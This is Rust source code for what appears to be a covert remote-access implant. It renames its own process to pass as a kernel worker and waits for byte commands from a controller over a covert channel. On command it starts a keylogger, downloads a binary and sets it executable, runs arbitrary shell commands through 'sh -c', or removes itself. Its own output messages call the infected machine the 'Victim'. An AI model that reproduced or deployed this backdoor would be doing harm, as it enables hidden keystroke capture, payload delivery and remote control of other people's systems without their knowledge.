mod covert;
mod keylogger;

use std::fs::File;
use std::io::Write;
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::net::Ipv4Addr;

const CMD_START_LOGGER: u8   = 0x10;
const CMD_STOP_LOGGER: u8    = 0x20;
const CMD_UNINSTALL: u8      = 0x30;
const CMD_START_TRANSFER: u8 = 0x40;
const CMD_EOF: u8            = 0x41;

fn set_process_name(name: &str) {
    let _ = std::fs::write("/proc/self/comm", name);
    
    #[cfg(target_os = "linux")]
    unsafe {
        let c_name = std::ffi::CString::new(name).unwrap();
        libc::prctl(libc::PR_SET_NAME, c_name.as_ptr() as libc::c_ulong, 0, 0, 0);
    }
}

fn main() {
    set_process_name("kworker/u2:1-events"); 

    println!("[*] Victim active. Disguised as kworker. Listening...");

    loop {
        if let Some((byte, commander_ip)) = covert::CovertChannel::receive_byte() {
            match byte {
                CMD_START_LOGGER => {
                    println!("[+] Signal from {}. Starting Keylogger...", commander_ip);
                    let channel = Arc::new(Mutex::new(covert::CovertChannel::new(commander_ip)));
                    keylogger::start(channel); 
                }

                CMD_START_TRANSFER => {
                    println!("[*] Receiving file transfer...");
                    receive_file("received_binary");
                }

                CMD_UNINSTALL => {
                    println!("[!] Uninstall signal received. Cleaning up...");
                    let _ = std::fs::remove_file("received_binary");
                    std::process::exit(0);
                }

                _ => {
                    handle_shell_command(byte);
                }
            }
        }
    }
}
fn receive_file(filename: &str) {
    let mut file = File::create(filename).unwrap();
    loop {
        if let Some((byte, _)) = covert::CovertChannel::receive_byte() {
            if byte == CMD_EOF { break; }
            file.write_all(&[byte]).unwrap();
        }
    }
    println!("[+] File received and saved as {}", filename);
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(metadata) = std::fs::metadata(filename) {
            let mut perms = metadata.permissions();
            perms.set_mode(0o755);
            let _ = std::fs::set_permissions(filename, perms);
        }
    }
}

fn handle_shell_command(first_byte: u8) {
    let mut buffer = vec![first_byte];
    loop {
        if let Some((byte, _)) = covert::CovertChannel::receive_byte() {
            if byte == b'\n' { break; }
            buffer.push(byte);
        }
    }
    let cmd = String::from_utf8_lossy(&buffer);
    println!("[*] Executing: {}", cmd);
    
    let output = Command::new("sh").arg("-c").arg(cmd.as_ref()).output();
    if let Ok(out) = output {
        println!("[+] Output: {}", String::from_utf8_lossy(&out.stdout));
    }
}
